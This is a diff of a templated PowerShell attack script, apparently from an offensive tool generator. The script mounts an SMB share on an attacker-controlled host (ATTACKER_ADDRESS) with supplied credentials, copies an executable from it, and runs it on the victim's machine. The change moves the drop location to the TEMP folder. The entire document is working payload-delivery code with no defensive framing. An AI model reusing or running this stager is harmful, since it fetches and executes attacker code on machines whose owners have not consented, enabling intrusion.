@@ -1,6 +1,5 @@
 $victimDisk = "{{POWERSHELL_GENERATOR_VICTIM_DISK}}"
 $powershellGeneratorExeFilename = "{{POWERSHELL_GENERATOR_EXE_FILENAME}}"
-$victimFolderPath = "{{POWERSHELL_GENERATOR_VICTIM_FOLDER_PATH}}"
 $attackerAddress = "{{ATTACKER_ADDRESS}}"
 $smbShare = "{{SMB_SHARE}}"
 $smbUser = "{{SMB_USER}}"
@@ -14,12 +13,7 @@ if (Get-PSDrive -Name $victimDisk -ErrorAction SilentlyContinue) {
     Remove-PSDrive -Name $victimDisk
 }
 New-PSDrive -Name $victimDisk -PSProvider FileSystem -Root "\\$attackerAddress\$smbShare" -Credential $cred -Persist *> $null
-if (Test-Path $victimFolderPath) {
-    Copy-Item -Path "${victimDisk}:\$powershellGeneratorExeFilename" -Destination $victimFolderPath
-} else {
-    New-Item -ItemType Directory -Path $victimFolderPath -Force
-    Copy-Item -Path "${victimDisk}:\$powershellGeneratorExeFilename" -Destination $victimFolderPath
-}
+Copy-Item -Path "${victimDisk}:\$powershellGeneratorExeFilename" -Destination $env:TEMP
 Remove-PSDrive -Name $victimDisk
-& "$victimFolderPath\$powershellGeneratorExeFilename"
+& "$env:TEMP\$powershellGeneratorExeFilename"
 Exit
